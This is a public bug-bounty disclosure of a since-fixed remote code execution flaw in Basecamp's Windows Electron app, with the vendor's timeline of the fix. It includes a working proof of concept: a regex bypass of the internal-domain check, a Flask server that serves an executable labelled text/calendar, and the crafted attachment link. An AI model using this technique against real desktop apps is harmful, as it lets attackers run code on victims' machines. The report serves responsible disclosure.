---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/desktop
  - os/windows
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2020-11-19
submitted: 2020-10-23T11:30:45.346Z
bounty_usd: null
votes: 48
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "co0sin"
source: "https://hackerone.com/reports/1016966"
title: "Remote Code Execution in Basecamp Windows Electron App"
---
# Remote Code Execution in Basecamp Windows Electron App

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 48 | **Program:** Basecamp | **Disclosed:** 2020-11-19

- Report: [https://hackerone.com/reports/1016966](https://hackerone.com/reports/1016966)
- CWE: Code Injection
- Submitted: 2020-10-23T11:30:45.346Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The Windows application for Basecamp, allows a "Download" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.

I was able to craft a link, which when clicked by a user, will be downloaded and executed! 

To get file execution on the user, we bypass the restrictions first:
There is a regular expression which checks for "internal domains", which can easily be bypassed by controlling the subdomain. The host pattern is `/(launchpad\.37signals\.com|launchpad\.(?:dev|test))/` and `/(3\.(?:staging\.)?basecamp\.com|bc3\.(?:dev|test))/`. By controlling the subdomain, and setting it to something like `launchpad.dev.mydomain.com`, we can bypass this regular expression verification.

Since we'll be sending the request to our own server, we simply need to return `text/calendar` as the content-type header. This can be seen in the Electron code in `OPENABLE_MIME_TYPES = new Set(["text/calendar"]);`
And then when adding the URL to your post, simply add the `?attachment=true` to the URL. 


To reproduce, simply register any subdomain that starts with `launchpad.dev.` (mine is `launchpad.dev.████`).
An HTTP server with the needed mimetype header, can be setup with Flask easily with this code:
```
from flask import Flask, send_from_directory
app = Flask(__name__)
@app.route('/<path:path>')
def hello(path):
    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
if __name__ == '__main__':
    app.run(port=80,host="0.0.0.0")
```

Then add the link to your post with the appropriate `attachment` parameter, as such:
`http://launchpad.dev.█████████/file.exe?attachment=true`

## Impact

Remote code execution on any user which clicks a link on your crafted post through the desktop app.

## Timeline

- **Report Severity Updated**
- **2020-10-23** @co0sin: Demo:
██████
- **Report Filed**
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Triaged**
- **2020-10-23** @co0sin: Hey @georgeclaghorn, I'm pretty sure you don't need both the attacker and the victim on an account together. Can you not read someone else's post or comment through the desktop application? This should also work in the comments section, as any URL embedded in the page would work.
- **2020-10-23** @georgeclaghorn: ”Account” in Basecamp refers to the shared top-level space, like a “team” in Slack or “organization” in GitHub. Accounts are separate from IDs used to log in.
- **2020-10-23** @co0sin: That makes sense, thanks for the clarification. Thank you so much for the bounty!
- **2020-10-23** @co0sin: @georgeclaghorn I've looked into this further and might have found a way to make this exploitable towards other users + maybe another security issue.

This is what I've done, let me know if you can reproduce:
1. I basically created another user, I added them to my basecamp and set them as an account owner in Adminland.
2. After adding them, I could see them in the "Pings" menu, and sent them a message with my link.
3. The user received an email that I've pinged them:
██████
4. The link in that ping email, "respond in Basecamp", **was identical to the invitation link:** `https://launchpad.37signals.com/4875300/invitations/f5f90ae955983d9d881063f170d56ad0?return_to=https%3A%2F%2F3.basecamp.com%2F4893488%2Fcircles%2F19350745`

When I clicked the link that prompted me to respond, it was **like I accepted that invitation**. To verify, I logged out and in through the Desktop app, and I was prompted to choose an account!

██████

To be honest it does still require *some* user interaction (clicking the link to reply to the message via email), but if a user does that, then goes to the desktop app and clicks my link - RCE. And he didn't even actually mean to accept my invitation.
- **2020-10-26** @georgeclaghorn: Hi @co0sin,

The desktop app team said, “First of all, kudos! This is a super clever exploit.”

We’ve prepared a test build with a fix [here](https://bc3-desktop.s3.amazonaws.com/builds/289e268/windows/basecamp3setup.exe) (SHA256 checksum: `efd10e63309978480e5ab07d0131a54a367e00eea69bb10455f7382d241419e9`). Would you mind verifying that this issue is fixed?
- **Report Severity Updated**
- **Bounty Awarded**
- **2020-10-26** @co0sin: Thanks for the additional bounty!
I just did a sweep, regular expression looks fine now. You should still note that the start of the host is not enforced. So things like `random.3.basecamp.com` will still pass. It's not really an issue but could open more attack surface for future open redirects.

And you have a typo @ `INTERNAL_BLOB_PATH_ATTERN` ;)
- **Report Resolved**
- **Agreed On Going Public**
- **2020-11-19** @co0sin: @georgeclaghorn Can we censor all images, videos, attachments and the domain I've used for the PoC?
- **2020-11-19** @georgeclaghorn: Sure. I think I’ve done that now, but please check.
- **Agreed On Going Public**
- **Report Became Public**
